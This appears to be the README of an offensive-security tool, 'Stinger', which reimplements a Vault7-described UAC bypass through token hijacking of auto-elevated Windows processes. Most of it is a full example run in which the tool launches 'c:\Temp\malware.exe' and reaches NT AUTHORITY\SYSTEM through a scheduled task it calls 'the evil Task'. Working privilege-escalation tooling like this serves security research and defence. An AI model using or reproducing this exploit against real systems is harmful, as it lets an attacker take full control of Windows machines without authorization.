# Stinger

CIA Vault7 leak describes Stinger[0] as a Privilege Escalation module in the "Fine Dining" toolset. Stinger
is a "UAC bypass that obtains the token from an auto-elevated process, modifies it, and reuses it to 
execute as administrator". This is an implementation of Stinger, including debugging routines and some
additional tradecraft to obtain `NT AUTHORITY\SYSTEM` rights. The exploit works on Windows 7 through Windows 
10 to run privileged code through token hijacking of an autoelevated process (e.g. `Taskmgr.exe`) from 
a UAC restricted process. This technique to steal a privileged token and elevate a thread also works on 
Windows 11, however it is not possible to use it for CreateProcessWithLogonW which detects `BAD IMPERSONATION` 
or with CreateFile, Registry, Process, COM ITask*, Named Pipes etc as the operations fail with `ACESS_DENIED` 
or `E_BAD_IMPERSONATION`. This exploit closely resembles UAC Magic[1] and thus it is believed that Stinger is 
an implementation of UAC Magic based on the description and time which it was used within the CIA for modular 
malware in "Fine Dining". This is a tokenhijacking attack that bypasses UAC on Windows 7 -> Windows 10, and on 
Windows 11 gives only an elevated thread to further experiment with. This exploit leverages a COM object 
ITaskService from the privileged thread to run commands under `NT AUTHORITY\SYSTEM`. 

Here is an example of the UAC bypass being used on a vulnerable Windows 7 host. 

``` 
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\TestUser\Downloads>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled

C:\Users\TestUser\Downloads>Stinger.exe taskmgr.exe cmd.exe /c c:\\Temp\\malware.exe
Show our process security context...
User: TestUser
Domain: TESTPC
User SID: S-1-5-21-3089230831-4110903467-601958294-1001
Checking token DACL...
Allowed ACE: GENERIC_ALL
Account: TESTPC\TestUser
SID: S-1-5-21-3089230831-4110903467-601958294-1001
Allowed ACE: GENERIC_ALL
Account: NT AUTHORITY\SYSTEM
SID: S-1-5-18
Allowed ACE: GENERIC_READ GENERIC_EXECUTE
LookupAccountSid failed: 1332
SID: S-1-5-5-0-107317
Token is not elevated.
Token is not restricted
Dumping token privileges...
[-] Disabled Privilege: SeShutdownPrivilege Attributes : 0
[+] Enabled Privilege: SeChangeNotifyPrivilege Attributes : 3
    This privilege is enabled by default.
[-] Disabled Privilege: SeUndockPrivilege Attributes : 0
[-] Disabled Privilege: SeIncreaseWorkingSetPrivilege Attributes : 0
[-] Disabled Privilege: SeTimeZonePrivilege Attributes : 0
Process ID: 3992
Successfully duplicated token
H4x0r1nG the token ...
Enabling privilege: SeIncreaseQuotaPrivilege
Enabling privilege: SeSecurityPrivilege
Enabling privilege: SeTakeOwnershipPrivilege
Enabling privilege: SeLoadDriverPrivilege
Enabling privilege: SeSystemProfilePrivilege
Enabling privilege: SeSystemtimePrivilege
Enabling privilege: SeProfileSingleProcessPrivilege
Enabling privilege: SeIncreaseBasePriorityPrivilege
Enabling privilege: SeCreatePagefilePrivilege
Enabling privilege: SeBackupPrivilege
Enabling privilege: SeRestorePrivilege
Enabling privilege: SeShutdownPrivilege
Enabling privilege: SeDebugPrivilege
Enabling privilege: SeSystemEnvironmentPrivilege
Enabling privilege: SeChangeNotifyPrivilege
Enabling privilege: SeRemoteShutdownPrivilege
Enabling privilege: SeUndockPrivilege
Enabling privilege: SeManageVolumePrivilege
Enabling privilege: SeImpersonatePrivilege
Enabling privilege: SeCreateGlobalPrivilege
Enabling privilege: SeIncreaseWorkingSetPrivilege
Enabling privilege: SeTimeZonePrivilege
Enabling privilege: SeCreateSymbolicLinkPrivilege
Dropping IL...
Initialized medium IL SID
Token lowered to medium integrity
COM init...
Attemping to bypass UAC with the token...
ImpersonateLoggedOnUser succeeded..
User: TestUser
Domain: TESTPC
User SID: S-1-5-21-3089230831-4110903467-601958294-1001
Checking token DACL...
Allowed ACE: GENERIC_ALL
Account: BUILTIN\Administrators
SID: S-1-5-32-544
Allowed ACE: GENERIC_ALL
Account: NT AUTHORITY\SYSTEM
SID: S-1-5-18
Allowed ACE: GENERIC_READ GENERIC_EXECUTE
LookupAccountSid failed: 1332
SID: S-1-5-5-0-107317
Token is elevated!
Token is not restricted
Dumping token privileges...
[+] Enabled Privilege: SeIncreaseQuotaPrivilege Attributes : 2
[+] Enabled Privilege: SeSecurityPrivilege Attributes : 2
[-] Disabled Privilege: SeTakeOwnershipPrivilege Attributes : 0
[-] Disabled Privilege: SeLoadDriverPrivilege Attributes : 0
[+] Enabled Privilege: SeSystemProfilePrivilege Attributes : 2
[+] Enabled Privilege: SeSystemtimePrivilege Attributes : 2
[+] Enabled Privilege: SeProfileSingleProcessPrivilege Attributes : 2
[+] Enabled Privilege: SeIncreaseBasePriorityPrivilege Attributes : 2
[+] Enabled Privilege: SeCreatePagefilePrivilege Attributes : 2
[-] Disabled Privilege: SeBackupPrivilege Attributes : 0
[-] Disabled Privilege: SeRestorePrivilege Attributes : 0
[+] Enabled Privilege: SeShutdownPrivilege Attributes : 2
[-] Disabled Privilege: SeDebugPrivilege Attributes : 0
[+] Enabled Privilege: SeSystemEnvironmentPrivilege Attributes : 2
[+] Enabled Privilege: SeChangeNotifyPrivilege Attributes : 3
    This privilege is enabled by default.
[+] Enabled Privilege: SeRemoteShutdownPrivilege Attributes : 2
[+] Enabled Privilege: SeUndockPrivilege Attributes : 2
[+] Enabled Privilege: SeManageVolumePrivilege Attributes : 2
[-] Disabled Privilege: SeImpersonatePrivilege Attributes : 0
[+] Enabled Privilege: SeCreateGlobalPrivilege Attributes : 3
    This privilege is enabled by default.
[+] Enabled Privilege: SeIncreaseWorkingSetPrivilege Attributes : 2
[+] Enabled Privilege: SeTimeZonePrivilege Attributes : 2
[+] Enabled Privilege: SeCreateSymbolicLinkPrivilege Attributes : 2
Attemping to run command as NT AUTHORITY\SYSTEM via COM...
Created ITaskService..
Connected to ITaskService..
Registering the evil Task..
Task created successfully.
Executed command as NT AUTHORITY\SYSTEM... wait for cleanup
Task deleted successfully. 
```

Your commands have executed under `NT AUTHORITY\SYSTEM`. Happy New Year!

## References

* [0]: [Fine Dining Tool Module List, Vault 7, Wikileaks](https://wikileaks.org/ciav7p1/cms/page_20251107.html).
* [1]: [Reading your way around UAC, James Forshaw](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html).

## License

These files are available under a Attribution-NonCommercial-NoDerivatives 4.0 International license.
